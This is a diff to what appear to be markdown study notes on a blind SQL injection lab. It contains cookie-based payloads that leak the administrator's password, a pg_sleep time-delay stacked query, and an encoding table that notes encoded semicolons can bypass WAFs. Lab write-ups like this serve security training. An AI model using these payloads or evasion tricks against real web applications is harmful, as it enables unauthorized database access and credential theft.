@@ -635,3 +635,45 @@ TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--          
 TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--            -->Now that you know that the administrator is the first user in the table, modify the query once again to leak their password:
 
 Log in as administrator using the stolen password to solve the lab.
+
+## **Why %3B is Needed & Complete Encoding Guide**
+
+### **Why URL Encoding is Required:**
+
+The semicolon `;` needs to be encoded as `%3B` because:
+
+1. **HTTP Protocol Rules**: Semicolons have special meaning in HTTP headers
+2. **Cookie Delimiters**: Cookies use semicolons to separate different cookies
+3. **SQL Injection Prevention**: Some WAFs block raw semicolons but miss encoded ones
+4. **Parser Confusion**: Raw semicolons might break HTTP parsing
+
+Your payload:
+```http
+Cookie: TrackingId='%3bSELECT CASE WHEN(1=1)THEN pg_sleep(10) ELSE pg_sleep(0) END--
+```
+Gets decoded to:
+```sql
+TrackingId=';SELECT CASE WHEN(1=1)THEN pg_sleep(10) ELSE pg_sleep(0) END--
+```
+
+## **Complete Character Encoding Reference**
+
+### **Critical SQL Injection Characters to Encode:**
+
+| Character | URL Encoding | Why Encode |
+|-----------|--------------|------------|
+| `;` | `%3B` | End of SQL statement |
+| `'` | `%27` | String delimiter |
+| `"` | `%22` | String delimiter |
+| `--` | `%2D%2D` | SQL comment |
+| `#` | `%23` | SQL comment |
+| `/*` | `%2F%2A` | Start comment |
+| `*/` | `%2A%2F` | End comment |
+| `=` | `%3D` | Comparison operator |
+| ` ` (space) | `%20` or `+` | Space character |
+| `(` | `%28` | Parentheses |
+| `)` | `%29` | Parentheses |
+| `|` | `%7C` | Concatenation |
+| `&` | `%26` | AND operator |
+| `,` | `%2C` | Parameter separator |
+
